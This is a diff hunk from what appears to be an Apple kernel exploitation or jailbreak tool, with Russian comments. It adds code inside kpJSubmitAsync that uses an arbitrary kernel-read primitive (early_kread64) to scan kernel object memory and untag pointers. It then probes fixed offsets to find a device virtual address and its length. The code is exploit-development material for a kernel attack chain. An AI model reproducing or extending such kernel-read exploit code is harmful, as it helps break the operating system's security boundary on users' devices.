@@ -6708,6 +6708,24 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     dva = dv2;
                     dvaLen = ln2;
                 }
+                // 1.9.183: mapObj не на +0x70 у этих классов — контент-поиск:
+                // каждый kernel-ptr в объекте → probe [X+0xa0]/[X+0xa8]; пара
+                // {DVA!=0, len∈{0x1000,0x4000}} и есть наш DVA, где бы ни лежал.
+                if (!cmdVA && (uint32_t)(cand & 0x3fff) + 0x100 <= 0x4000) {
+                    for (uint32_t o = 0; o + 8 <= 0x100 && !cmdVA; o += 8) {
+                        uint64_t q = early_kread64(cand + o);
+                        uint64_t u = kp_untag_ptr(q);
+                        if (!kpLooksLikeKernelPointer(u) || !kpSafeToRead(u)) continue;
+                        uint64_t a0 = early_kread64(u + 0xa0);
+                        uint64_t a8 = early_kread64(u + 0xa8);
+                        if (!(a0 && (a8 == 0x1000 || a8 == 0x4000))) continue;
+                        kpNote(r, [NSString stringWithFormat:@"    cmd+%#x → %#llx: [+0xa0]=%#llx [+0xa8]=%#llx ← DVA/len ✓",
+                                  o, (unsigned long long)u, (unsigned long long)a0, (unsigned long long)a8]);
+                        cmdVA = cand;
+                        dva = a0;
+                        dvaLen = a8;
+                    }
+                }
             }
         }
         if (cmdVA) {
